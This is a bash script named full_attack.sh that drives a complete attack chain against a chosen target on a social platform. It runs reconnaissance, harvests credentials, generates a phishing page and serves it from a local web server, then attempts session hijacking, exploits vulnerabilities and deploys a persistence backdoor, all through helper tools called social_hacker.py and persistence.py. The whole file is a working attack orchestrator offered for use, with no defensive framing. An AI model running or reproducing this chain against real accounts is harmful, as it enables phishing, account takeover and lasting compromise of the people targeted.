#!/bin/bash
# full_attack.sh
TARGET=$1
PLATFORM=$2
OUTPUT_DIR="results_$(date +%Y%m%d_%H%M%S)"
IP=$(hostname -I | awk '{print $1}')  # Get local IP address

echo "[+] Full Attack Chain: $TARGET ($PLATFORM)"
echo "[+] Output directory: $OUTPUT_DIR"
mkdir -p $OUTPUT_DIR

# 1. Recon
echo "[*] Step 1: Reconnaissance"
python3 social_hacker.py recon -t $TARGET -p $PLATFORM -o $OUTPUT_DIR/recon_results.json -v

# 2. Deploy phishing
echo "[*] Step 2: Deploying phishing"
python3 social_hacker.py harvest -t $TARGET -p $PLATFORM -o $OUTPUT_DIR/harvested_credentials.json

# 3. Social engineer phishing link
echo "[*] Step 3: Generating phishing template"
python3 social_hacker.py exploit -t $TARGET -p $PLATFORM --generate-phish $OUTPUT_DIR/phishing_$PLATFORM.html

# 4. Start phishing server
echo "[*] Step 4: Starting phishing server on http://$IP:8000"
python3 -m http.server 8000 > $OUTPUT_DIR/server.log 2>&1 &
SERVER_PID=$!
echo "[*] Phishing server running on port 8000 (PID: $SERVER_PID)"

# 5. Wait for creds, then hijack
echo "[*] Step 5: Waiting for credentials (press Ctrl+C to stop waiting)"
sleep 30  # Wait 30 seconds for user to click link

echo "[*] Step 6: Attempting session hijacking"
python3 social_hacker.py hijack -t $TARGET -p $PLATFORM -o $OUTPUT_DIR/hijacked_sessions.json -v

# 6. Exploit & persist
echo "[*] Step 7: Exploiting vulnerabilities"
python3 social_hacker.py exploit -t $TARGET -p $PLATFORM -x -s -c -o $OUTPUT_DIR/vulnerabilities.json -v

# 7. Deploy backdoor
echo "[*] Step 8: Deploying persistence"
python3 modules/persistence.py -p $PLATFORM -u $TARGET -P "dummy_password" -b email -s $OUTPUT_DIR/persistence_config.json

# 8. Cleanup
echo "[*] Step 9: Cleaning up"
kill $SERVER_PID 2>/dev/null
echo "[*] Phishing server stopped"

echo "[+] Attack chain completed!"
echo "[+] Results saved in: $OUTPUT_DIR"
